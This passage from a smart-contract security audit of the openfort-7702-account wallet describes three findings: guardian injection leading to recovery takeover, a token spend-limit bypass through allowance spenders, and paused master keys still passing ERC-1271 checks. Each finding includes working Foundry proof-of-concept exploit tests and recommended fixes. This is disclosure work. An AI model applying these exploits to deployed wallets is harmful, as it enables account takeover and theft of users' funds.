Tests focused on ETH transfer via `call.value` and ERC‑20 transfers with supported selectors. They did not include protocol-managed ETH held in EntryPoint deposits or outflows via selectors unrecognized by the spend parser.

##### Recommendation

- Treat EntryPoint deposit/withdrawal methods as native ETH spend by decoding withdrawal amounts from calldata and enforcing them against `NATIVE_ADDRESS` spend rules.  
- Consider denylisting StakeManager withdrawal selectors for session keys unless explicitly required.  
- Clearly document that ETH outflows beyond `call.value` must be included in spend‑limit parsing.

##### References

1. [OPF7702.sol#L394-L414](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L394-L414)  
2. [StakeManager.sol#L136-L148](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/lib/account-abstraction/contracts/core/StakeManager.sol#L136-L148)

<a id="finding-open-5"></a>
### OPEN-5 — SocialRecoveryManager.initializeGuardians is re-callable and bypasses guardian timelocks/lock, enabling guardian injection and full recovery takeover
✅ Valid
##### Summary

`SocialRecoveryManager.initializeGuardians` is intended as a one-time bootstrap method to seed an account’s first guardian during initialization. However, it remains callable indefinitely and lacks the timelock, lock-state, and recovery-state protections enforced by all other guardian-mutating functions. Any caller able to make the account itself invoke this function—most realistically a compromised session key with permissive `canExecute` permissions—can immediately inject new attacker-controlled guardians without delay. Once inserted, these guardians can start and later complete recovery, enabling rotation of the master key to an attacker-owned key. This breaks core recovery-security invariants and collapses the intended trust and timelock model, allowing a full and persistent account takeover.

##### Details

- Explanation:  
  The account calls `initializeGuardians` during initialization to set its first guardian. Post-initialization, the same function remains externally callable as long as `msg.sender == account`. Because session-key executions route through the account via EntryPoint, a compromised session key with permissive call permissions can cause the account to invoke `initializeGuardians` again. Unlike the timelocked `proposeGuardian`/`confirmGuardianProposal` flow, this function immediately activates the guardian without checking lock state or ongoing recovery. Once attacker guardians are active, the attacker can start recovery and later complete it using signatures from the guardians they injected, rotating the master key.

- Root cause:  
  Missing one-time initialization guard, missing lock/recovery-state checks, and permissive execution routing through the account.

- Code location:  
  Vulnerable logic in `initializeGuardians` allows unconditional guardian insertion:  
  [src/utils/SocialRecover.sol#L87-L101](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L87-L101)

- Brief code snippets:

```solidity
function initializeGuardians(address _account, bytes32 _initialGuardian) external override {
    if (msg.sender != _account) revert ...Unauthorized();
    if (_initialGuardian == bytes32(0)) revert ...AddressCantBeZero();
    guardiansData[_account].guardians.push(_initialGuardian);
    GuardianIdentity storage gi = guardiansData[_account].data[_initialGuardian];
    gi.isActive = true;
    gi.index = 0;
    gi.pending = 0;
}
```

```solidity
function proposeGuardian(address _account, bytes32 _guardian) external override {
    if (msg.sender != _account) revert ...Unauthorized();
    if (isLocked(_account)) revert ...AccountLocked();
    ...
    gi.pending = block.timestamp + securityPeriod;
}
```

##### Impact

- Immediate bypass of intended guardian-management timelock and lock constraints  
- Injection of attacker-controlled guardians at any time  
- Start and completion of recovery using attacker guardians  
- Full and persistent rotation of the master key to attacker control  
- Permanent account compromise and unrestricted access to user assets  

##### Steps to Reproduce

1. Run the PoC test:

   ```bash
   cd openfort-7702-account
   forge test --match-path test/by-contract/POC_InitializeGuardiansReplay_ab5b2cc6.t.sol -vvv
   ```

2. The test demonstrates:
   - a session-key signed UserOperation re-calls `initializeGuardians` post-initialization,
   - the attacker becomes an active guardian,
   - the attacker starts recovery and completes it,
   - the account’s master key at index 0 changes to the attacker-controlled key.

###### PoC Source

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {BaseData} from "./../BaseData.t.sol";
import {OPFMain} from "src/core/OPFMain.sol";
import {GasPolicy} from "src/utils/GasPolicy.sol";
import {EntryPoint} from "lib/account-abstraction/contracts/core/EntryPoint.sol";
import {IEntryPoint} from "lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {WebAuthnVerifierV2} from "src/utils/WebAuthnVerifierV2.sol";
import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";
import {PackedUserOperation} from
    "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";

/**
 * @title POC: initializeGuardians is replayable, enabling guardian injection and recovery takeover
 * @notice Proof Statement: Proves that after an account is initialized, a session key that is permitted to call
 *         `SocialRecoveryManager.initializeGuardians(account, guardianHash)` can call it again to immediately add an
 *         attacker-controlled guardian without any timelock/lock checks. The injected guardian can then start a
 *         recovery and, with quorum computed from the now-expanded guardian set, complete recovery to install a new
 *         attacker-controlled master key, permanently taking over the account.
 *
 * Bug Vector:
 * 1) Deploy OPFMain + SocialRecoveryManager and initialize the account with a single initial guardian (not attacker).
 * 2) Register an EOA session key and grant it can-call permission for
 *    `SocialRecoveryManager.initializeGuardians(account, attackerGuardianHash)`.
 * 3) Using only a session-key signed UserOperation, call `initializeGuardians` again to inject `attackerGuardianHash`.
 * 4) As the injected guardian EOA, call `startRecovery(account, attackerRecoveryKey)`.
 * 5) After `recoveryPeriod`, complete recovery with the injected guardian's signature and observe the master key
 *    replaced by `attackerRecoveryKey`.
 */
contract POC_InitializeGuardiansReplay_ab5b2cc6 is BaseData {
    function setUp() public {
        (owner, ownerPK) = makeAddrAndKey("accountEOA");
        (sender, senderPK) = makeAddrAndKey("bundler");
        (sessionKey, sessionKeyPK) = makeAddrAndKey("sessionKey");
        (guardian, guardianPK) = makeAddrAndKey("initialGuardianEOA");

        deal(owner, 10 ether);
        deal(sender, 10 ether);

        entryPoint = IEntryPoint(payable(address(new EntryPoint())));
        webAuthn = new WebAuthnVerifierV2();
        gasPolicy = new GasPolicy(DEFAULT_PVG, DEFAULT_VGL, DEFAULT_CGL, DEFAULT_PMV, DEFAULT_PO);
        recoveryManager =
            new SocialRecoveryManager(RECOVERY_PERIOD, LOCK_PERIOD, SECURITY_PERIOD, SECURITY_WINDOW);

        implementation = new OPFMain(
            address(entryPoint), address(webAuthn), address(gasPolicy), address(recoveryManager)
        );

        _etch();

        // Initialize with EOA master key and a real (non-attacker) guardian hash.
        bytes32 initialGuardianHash = keccak256(abi.encodePacked(guardian));
        KeyDataReg memory mkRegLocal = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max,
            validAfter: 0,
            limits: 0,
            key: _getKeyEOA(owner),
            keyControl: KeyControl.Self
        });
        KeyDataReg memory emptySk = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: 0,
            validAfter: 0,
            limits: 0,
            key: "",
            keyControl: KeyControl.Self
        });

        bytes32 digest = account.getDigestToInit(mkRegLocal, emptySk, initialGuardianHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPK, digest);
        bytes memory initSig = abi.encodePacked(r, s, v);

        vm.prank(owner);
        account.initialize(mkRegLocal, emptySk, initSig, initialGuardianHash);

        // Register the session key and grant it permission to call initializeGuardians on the recovery manager.
        KeyDataReg memory sessionKeyReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: uint48(block.timestamp + 30 days),
            validAfter: 0,
            limits: 10,
            key: _getKeyEOA(sessionKey),
            keyControl: KeyControl.Self
        });

        vm.prank(owner);
        account.registerKey(sessionKeyReg);

        bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(sessionKey));

        vm.prank(owner);
        account.setCanCall(
            sessionKeyId,
            address(recoveryManager),
            SocialRecoveryManager.initializeGuardians.selector,
            true
        );

        // Prefund the account in EntryPoint so `handleOps` can execute.
        vm.prank(sender);
        entryPoint.depositTo{value: 2 ether}(owner);
    }

    function test_POC_SessionKeyCanInjectGuardianAndTakeOverViaRecovery() external {
        (address attackerGuardian, uint256 attackerGuardianPk) = makeAddrAndKey("attackerGuardianEOA");
        bytes32 attackerGuardianHash = keccak256(abi.encodePacked(attackerGuardian));

        // --- Attack step 1: session key injects a new guardian immediately via replaying initializeGuardians.
        Call[] memory attackCalls = new Call[](1);
        attackCalls[0] = _createCall(
            address(recoveryManager),
            0,
            abi.encodeWithSelector(
                SocialRecoveryManager.initializeGuardians.selector, owner, attackerGuardianHash
            )
        );

        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, attackCalls)));

        assertTrue(
            recoveryManager.isGuardian(owner, attackerGuardianHash),
            "vuln: attacker guardian injected"
        );

        // --- Attack step 2: injected guardian starts recovery to a new attacker-controlled master key.
        address attackerMaster = makeAddr("attackerMasterEOA");
        KeyDataReg memory recoveryKey = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max,
            validAfter: 0,
            limits: 0,
            key: _getKeyEOA(attackerMaster),
            keyControl: KeyControl.Self
        });

        vm.prank(attackerGuardian);
        recoveryManager.startRecovery(owner, recoveryKey);

        // With 2 guardians (initial + attacker), quorum = ceilDiv(2,2) = 1.
        (,, uint32 quorum) = recoveryManager.recoveryData(owner);
        assertEq(quorum, 1, "setup: quorum should be 1 after injection");

        // --- Attack step 3: complete recovery with the injected guardian's signature.
        vm.warp(block.timestamp + RECOVERY_PERIOD + 1);

        bytes32 digest = recoveryManager.getDigestToSign(owner);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerGuardianPk, digest);
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = abi.encodePacked(r, s, v);

        account.completeRecovery(sigs);

        (bytes32 newMasterKeyId,) = account.keyAt(0);
        assertEq(newMasterKeyId, _computeKeyId(recoveryKey), "vuln: master key replaced by attacker");
    }

    function _etch() internal {
        vm.etch(owner, abi.encodePacked(bytes3(0xef0100), address(implementation)));
        account = OPFMain(payable(owner));
    }

    function _relayUserOp(PackedUserOperation memory userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }

    function _userOpSignedBySessionKey(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOpLocal(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );
        userOp.signature = _encodeEOASignature(_signUserOpLocal(userOp, sessionKeyPK));
    }

    function _populateUserOpLocal(
        PackedUserOperation memory userOp,
        bytes memory callData,
        bytes32 accountGasLimits,
        uint256 preVerificationGas,
        bytes32 gasFees,
        bytes memory paymasterAndData
    ) internal view returns (PackedUserOperation memory) {
        userOp.nonce = entryPoint.getNonce(owner, 1);
        userOp.callData = callData;
        userOp.accountGasLimits = accountGasLimits;
        userOp.preVerificationGas = preVerificationGas;
        userOp.gasFees = gasFees;
        userOp.paymasterAndData = paymasterAndData;
        return userOp;
    }

    function _signUserOpLocal(PackedUserOperation memory userOp, uint256 privateKey)
        internal
        view
        returns (bytes memory signature)
    {
        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, userOpHash);
        return abi.encodePacked(r, s, v);
    }

    function _encodeEOASignature(bytes memory signature) internal pure returns (bytes memory) {
        return abi.encode(KeyType.EOA, signature);
    }
}
```

##### Assumptions and Uncertainties

- Assumes a compromised session key with `canExecute` permissions covering the recovery manager and `initializeGuardians`.  
  If false, attacker cannot trigger the exploit.  
- Assumes no external constraints prevent the account from routing calls during normal operation.  
- Assumes the recovery manager instance behaves as deployed in production.

##### Why did tests miss this issue?

Tests only verify that `initializeGuardians` rejects non-account callers and that it functions during initialization. They do not assert that it must be single-use or blocked during lock and recovery, nor do they simulate a compromised session key invoking the recovery manager.

##### Recommendation

- Enforce single-use semantics by reverting if the guardian set is non-empty.  
- Apply the same lock and recovery-state checks used for all other guardian mutations.  
- Add regression tests ensuring `initializeGuardians` cannot be re-called post-initialization or during sensitive states.

##### References

1. [OPF7702Recoverable.sol#L98-L127](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702Recoverable.sol#L98-L127)  
2. [SocialRecover.sol#L87-L101](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L87-L101)  
3. [SocialRecover.sol#L108-L137](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L108-L137)  
4. [SocialRecover.sol#L270-L323](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/utils/SocialRecover.sol#L270-L323)

<a id="finding-open-4"></a>
### OPEN-4 — Token spend limits bypass via allowance-based spenders (e.g., Permit2/routers): spend accounting keys off call.target, not actual token outflow
✅ Valid
##### Summary

The wallet’s spend-limiting mechanism enforces per‑token limits only when a session‑key call directly targets the token contract or transfers native ETH. When the call instead targets an allowance‑based spender such as a DEX router, Permit2-like contract, or aggregator, the validator does not attribute the token outflow to the underlying token. As a result, any pre‑existing ERC‑20 allowance can be used to drain tokens far beyond configured spend caps, provided the session key is permitted to call the spender. This bypass aligns with common real‑world wallet states, where lingering approvals to widely used spender contracts are typical. The enforcement gap allows a malicious or compromised session key to execute arbitrary pull‑based transfers without incrementing the token’s spend counter, breaking the intended “per‑token spend per period” safety rail and enabling direct loss of funds.

##### Details

- Explanation:  
  `_validateCall` derives the “token under evaluation” exclusively from the immediate callee: `token = call.value > 0 ? NATIVE_ADDRESS : call.target`. Spend rules are evaluated only if `hasTokenSpend(keyId, token)` is true. For ERC‑20 outflow, this means spend enforcement only triggers when the callee *is* the token contract. If the call targets a spender holding an existing allowance, that spender can invoke `transferFrom` and pull funds from the account without any spend‑limit checks.

- Root cause:  
  Token spend enforcement keys off `call.target`, not the actual token(s) moved. No balance‑delta or indirect-outflow detection exists.

- Code location:  
  Enforcement gating in `_validateCall`:  
  [openfort-7702-account/src/core/OPF7702.sol#L403-L406](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L403-L406)

- Brief code snippets:
```solidity
address token = call.value > 0 ? NATIVE_ADDRESS : call.target;

if (hasTokenSpend(keyId, token)) {
    if (!_isTokenSpend(keyId, call.target, call.value, call.data)) {
        return false;
    }
}
```

##### Impact

- Bypass of per‑token spend limits through any spender with an existing allowance  
- Direct and unrestricted ERC‑20 asset drain  
- Misleading safety guarantees: token spend caps appear enforced but provide no protection against approved spenders  
- Repeatable exploitation within the same spend period because counters remain unchanged  

##### Steps to Reproduce

1. Ensure Foundry is installed.
2. Set a Sepolia RPC endpoint and run the PoC test:

   ```bash
   export SEPOLIA_RPC_URL="https://ethereum-sepolia-rpc.publicnode.com"
   forge test --match-path test/by-contract/POC_TokenSpendAllowanceBypass_a7f4b1a1.t.sol -vvv
   ```

3. Review the PoC source used:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Deploy} from "./../Deploy.t.sol";
import {PackedUserOperation} from
    "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract AllowanceSpender {
    function drain(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

/**
 * @title POC: Token spend limits bypass via allowance-based spender
 * @notice Proof Statement: Prove that configuring a per-token spend limit for ERC-20 token `T` does not
 *         bound actual token outflow when the session key calls a third-party spender contract `S` that
 *         pulls `T` via a pre-existing allowance; because validation keys spend rules off `call.target`,
 *         calling `S` does not consult the spend policy for `T`, enabling the session key to drain `T`
 *         beyond its configured limit.
 *
 * Bug Vector:
 * 1) The account has a pre-existing allowance of token `T` to spender `S`.
 * 2) Owner registers a session key, sets token spend limit for `T`, and grants `(ANY_TARGET, ANY_FN_SEL)`.
 * 3) The session key submits `execute(...)` calling `S.drain(T, account, attacker, amount)`.
 * 4) Validation checks spend rules only for `call.target == S` (not `T`) and skips the spend limiter.
 * 5) `T` is transferred out via `transferFrom(account, attacker, amount)`, exceeding the configured limit.
 */
contract POC_TokenSpendAllowanceBypass_a7f4b1a1 is Deploy {
    function setUp() public override {
        super.setUp();
        _quickInitializeAccount();
        _initializeAccount();
    }

    function test_POC_SessionKeyBypassesTokenSpendViaAllowanceSpender() external {
        AllowanceSpender spender = new AllowanceSpender();
        address attacker = makeAddr("attacker");

        // Fund the account with tokens and set a pre-existing allowance to the spender.
        uint256 initialBalance = 100e18;
        erc20.mint(owner, initialBalance);

        Call[] memory approveCalls = new Call[](1);
        approveCalls[0] = _createCall(
            address(erc20),
            0,
            abi.encodeWithSelector(IERC20.approve.selector, address(spender), type(uint256).max)
        );
        _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, approveCalls)));
        assertEq(erc20.allowance(owner, address(spender)), type(uint256).max);

        // Register a session key with a strict per-token spend limit on `erc20`.
        KeyDataReg memory eoaSessionKeyReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: uint48(block.timestamp + 1 days),
            validAfter: 0,
            limits: 10,
            key: _getKeyEOA(sessionKey),
            keyControl: KeyControl.Self
        });

        bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(sessionKey));
        uint256 tokenSpendLimit = 1e18;

        Call[] memory setupCalls = new Call[](3);
        setupCalls[0] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.registerKey.selector, eoaSessionKeyReg)
        );
        setupCalls[1] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setTokenSpend.selector,
                sessionKeyId,
                address(erc20),
                tokenSpendLimit,
                SpendPeriod.Month
            )
        );
        setupCalls[2] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.setCanCall.selector, sessionKeyId, ANY_TARGET, ANY_FN_SEL, true)
        );
        _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, setupCalls)));

        (SpendPeriod period, uint256 limit, uint256 spentBefore, uint256 lastUpdated) =
            account.tokenSpend(sessionKeyId, address(erc20));
        assertEq(uint8(period), uint8(SpendPeriod.Month));
        assertEq(limit, tokenSpendLimit);
        assertEq(spentBefore, 0);
        assertEq(lastUpdated, 0);

        // Attack: session key calls spender (NOT the token contract), so spend policy for `erc20` is skipped.
        uint256 drainAmount = 10e18;
        Call[] memory attackCalls = new Call[](1);
        attackCalls[0] = _createCall(
            address(spender),
            0,
            abi.encodeWithSelector(AllowanceSpender.drain.selector, address(erc20), owner, attacker, drainAmount)
        );
        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, attackCalls)));

        assertEq(erc20.balanceOf(attacker), drainAmount);
        assertEq(erc20.balanceOf(owner), initialBalance - drainAmount);

        (, , uint256 spentAfter, ) = account.tokenSpend(sessionKeyId, address(erc20));
        assertEq(spentAfter, 0, "Spend counter for token should remain unchanged (limit bypassed)");
    }

    function _relayUserOp(PackedUserOperation memory userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }

    function _userOpSignedByOwner(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOp(userOp);
        userOp.signature = _encodeEOASignature(signature);
    }

    function _userOpSignedBySessionKey(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOp(userOp, sessionKeyPK);
        userOp.signature = _encodeEOASignature(signature);
    }
}
```

##### Assumptions and Uncertainties

- Assumes the account has an existing allowance for the target token. If allowances are zeroed before session‑key use, this bypass is prevented.  
- Assumes the session key is permitted to call the spender. If can‑call rules disallow the spender, the issue does not arise.  
- No post‑call accounting exists; if such a mechanism were introduced, this finding would be invalidated.  

##### Why did tests miss this issue?

Tests focus only on direct calls to token contracts and do not model pull‑based transfers via external spenders holding existing allowances. As a result, the system never exercised scenarios where `call.target` differs from the token being drained.

##### Recommendation

- Enforce per‑token spend limits using mechanisms that cannot be bypassed via indirect spender calls.  
- Restrict or deny third‑party contract calls when token spend rules are configured unless explicitly modeled as safe.  
- Require or enforce allowance hygiene for tokens governed by spend limits, preventing reliance on large or persistent approvals.  
- Consider documenting that spend limits apply only to direct token calls if stricter guarantees are not intended.

##### References

1. [OPF7702.sol#L403-L406](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L403-L406)

<a id="finding-open-3"></a>
### OPEN-3 — ERC-1271 accepts paused master keys (isValidSignature ignores isActive)
✅ Valid
##### Summary

The ERC-1271 implementation in `OPF7702` incorrectly validates signatures from paused master keys. Although the key manager supports disabling keys via `pauseKey`, which sets `isActive = false`, the ERC-1271 validation paths only verify that the recovered key is marked as `masterKey` and never inspect its active state. As a result, external protocols relying on `IERC1271.isValidSignature` will continue to accept signatures from a paused master key even though ERC‑4337 user operations correctly reject those keys through `_keyValidation`. This inconsistency creates a revocation gap where users believe a compromised master key has been disabled, while it remains fully effective for off-chain approvals verified via ERC‑1271. The issue affects both EOA and WebAuthn signature paths and undermines the expected key‑lifecycle semantics.

##### Details

- The vulnerability arises because both `_validateEOASignature` and `_validateWebAuthnSignature` return success solely based on `sKey.masterKey`, ignoring `isActive`.
- Pausing a key updates storage but does not influence ERC‑1271 verification logic.
- ERC‑4337 validation enforces `isActive`, causing inconsistent authorization behavior across code paths.

**Root cause**
The ERC‑1271 validators omit checks on `isActive`, even though key pausing is supported and enforced elsewhere via `_keyValidation`.

**Code locations**
- `OPF7702.sol` EOA path: [src/core/OPF7702.sol#L582-L601](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L582-L601)
- `OPF7702.sol` WebAuthn path: [src/core/OPF7702.sol#L669-L674](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L669-L674)
- `KeysManager.sol` pausing logic: [src/core/KeysManager.sol#L509-L516](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/KeysManager.sol#L509-L516)

**Snippet (EOA path)**

```solidity
if (sKey.masterKey) return this.isValidSignature.selector;
```

**Snippet (WebAuthn path)**

```solidity
if (sKey.masterKey) return this.isValidSignature.selector;
```

##### Impact

- Paused master keys continue to validate via ERC‑1271, bypassing intended revocation.
- Off-chain approval flows (permits, order signing, meta‑transactions) may accept signatures the user expects to be invalid.
- Divergent security semantics between ERC‑4337 UserOps and ERC‑1271 increase risk of misuse and inconsistent integrations.

##### Steps to Reproduce

1. From the repository root, run the single PoC test:

   ```bash
   forge test --match-path test/by-contract/POC_ERC1271PausedMasterKey_1d526b94.t.sol -vvv
   ```

2. Observe the test passes and includes assertions that:
   - the master key is paused (`isActive == false`), and
   - `isValidSignature` still returns the ERC-1271 magic value for that key’s signature.

3. PoC source (verbatim):

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity 0.8.29;

   import {Test} from "lib/forge-std/src/Test.sol";

   import {IKey} from "src/interfaces/IKey.sol";
   import {OPFMain} from "src/core/OPFMain.sol";
   import {GasPolicy} from "src/utils/GasPolicy.sol";
   import {EntryPoint} from "lib/account-abstraction/contracts/core/EntryPoint.sol";
   import {IERC1271} from "lib/openzeppelin-contracts/contracts/interfaces/IERC1271.sol";
   import {WebAuthnVerifierV2} from "src/utils/WebAuthnVerifierV2.sol";
   import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";

   import {SignersData} from "../SignersData.t.sol";

   /**
    * @title POC: ERC-1271 Accepts Paused Master Key
    * @notice Proof Statement: Prove that after a WebAuthn master key is paused via `pauseKey`, `isValidSignature`
    *         still returns the ERC-1271 magic value for signatures produced by that paused key, because the ERC-1271
    *         path checks only `masterKey` and not `isActive`.
    *
    * Bug Vector:
    * 1. Initialize an account with a WebAuthn master key.
    * 2. Confirm `isValidSignature(hash, webauthnSig)` succeeds.
    * 3. Pause the master key on-chain (`isActive = false`).
    * 4. Re-check `isValidSignature(hash, webauthnSig)` and observe it still succeeds.
    */
   contract POC_ERC1271PausedMasterKey_1d526b94 is Test, SignersData, IKey {
       uint256 internal ownerPk;
       address internal owner;
       OPFMain internal account;

       function setUp() public {
           // Load a known-good WebAuthn signature vector.
           _populateWebAuthn("execution.json", ".batch");
           PubKey memory mkPubKey = PubKey({x: DEF_WEBAUTHN.X, y: DEF_WEBAUTHN.Y});

           // Deploy real dependencies locally (no forks / no mocks).
           EntryPoint entryPoint = new EntryPoint();
           WebAuthnVerifierV2 webAuthn = new WebAuthnVerifierV2();
           GasPolicy gasPolicy = new GasPolicy(110_000, 360_000, 240_000, 60_000, 60_000);
           SocialRecoveryManager recoveryManager =
               new SocialRecoveryManager(2 days, 5 days, 1.5 days, 0.5 days);

           OPFMain implementation = new OPFMain(
               address(entryPoint), address(webAuthn), address(gasPolicy), address(recoveryManager)
           );

           // EIP-7702 "setCode" simulation: the account lives at an EOA address.
           (owner, ownerPk) = makeAddrAndKey("owner");
           vm.etch(owner, abi.encodePacked(bytes3(0xef0100), address(implementation)));
           account = OPFMain(payable(owner));

           // Build master key registration payload.
           KeyDataReg memory mkReg = KeyDataReg({
               keyType: KeyType.WEBAUTHN,
               validUntil: type(uint48).max,
               validAfter: 0,
               limits: 0,
               key: abi.encode(mkPubKey.x, mkPubKey.y),
               keyControl: KeyControl.Self
           });

           // Session key omitted.
           KeyDataReg memory skReg = KeyDataReg({
               keyType: KeyType.EOA,
               validUntil: 0,
               validAfter: 0,
               limits: 0,
               key: "",
               keyControl: KeyControl.Self
           });

           bytes32 initialGuardian = keccak256(abi.encode(makeAddr("guardian")));
           bytes32 digest = account.getDigestToInit(mkReg, skReg, initialGuardian);

           // Sign the init digest with the EOA key controlling `owner` (EIP-7702 address).
           (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);
           bytes memory sig = abi.encodePacked(r, s, v);

           vm.prank(owner);
           account.initialize(mkReg, skReg, sig, initialGuardian);
       }

       function test_POC_ERC1271AcceptsPausedMasterKey() external {
           // Master key lives at index 0.
           (bytes32 mkId, KeyData memory mkData) = account.keyAt(0);
           assertTrue(mkData.masterKey, "setup: master key not stored at index 0");
           assertTrue(mkData.isActive, "setup: master key should start active");

           PubKey memory mkPubKey = PubKey({x: DEF_WEBAUTHN.X, y: DEF_WEBAUTHN.Y});
           bytes memory webauthnSig = abi.encode(
               DEF_WEBAUTHN.UVR,
               DEF_WEBAUTHN.AUTHENTICATOR_DATA,
               DEF_WEBAUTHN.CLIENT_DATA_JSON,
               DEF_WEBAUTHN.CHALLENGE_INDEX,
               DEF_WEBAUTHN.TYPE_INDEX,
               DEF_WEBAUTHN.R,
               DEF_WEBAUTHN.S,
               mkPubKey
           );

           // Known-good challenge for this fixture (from existing tests).
           bytes32 challenge =
               0xb3dc75bdf6e0365104000f50a3e9c7c6cb96a8729b2ef110f284e8dc9084f6a7;

           // Sanity: valid before pausing.
           assertEq(
               account.isValidSignature(challenge, webauthnSig), IERC1271.isValidSignature.selector
           );

           // Pause the master key.
           vm.prank(owner);
           account.pauseKey(mkId);

           KeyData memory paused = account.getKey(mkId);
           assertTrue(paused.masterKey, "setup: paused key lost masterKey flag");
           assertFalse(paused.isActive, "setup: key did not pause");

           // Vulnerability: still returns success even though the master key is paused.
           assertEq(
               account.isValidSignature(challenge, webauthnSig), IERC1271.isValidSignature.selector
           );
       }
   }
   ```

##### Assumptions and Uncertainties

- Assumes pausing a key is intended to disable all authorization surfaces. If pausing is meant to affect only ERC‑4337, practical impact decreases.
- Assumes external protocols rely on ERC‑1271 for authorization. If not, impact is diminished.
- If master keys are intended never to be paused, restrictions should be enforced on-chain to avoid user misconfiguration.

##### Why did tests miss this issue?

Tests cover valid/invalid signatures and key pausing for non‑master keys, but never evaluate `isValidSignature` after pausing a master key. The divergence between ERC‑4337 and ERC‑1271 key‑state validation was untested.

##### Recommendation

- Align ERC‑1271 validation with ERC‑4337 by requiring `masterKey && isActive` for signature acceptance.
- Consider explicitly requiring registration checks to avoid implicit validity of wiped keys.
- Update documentation to clarify expected behavior when pausing master keys.

##### References

1. [OPF7702.sol#L560-L675](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L560-L675)  
2. [OPF7702.sol#L292-L302](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L292-L302)  
3. [KeysManager.sol#L509-L516](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/KeysManager.sol#L509-L516)  
4. [OPF7702Test.t.sol#L74-L173](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/test/by-contract/OPF7702Test.t.sol#L74-L173)

<a id="finding-open-1"></a>
### OPEN-1 — Session key with broad canCall can take permanent control via SocialRecoveryManager guardian injection

##### Summary
✅ Valid
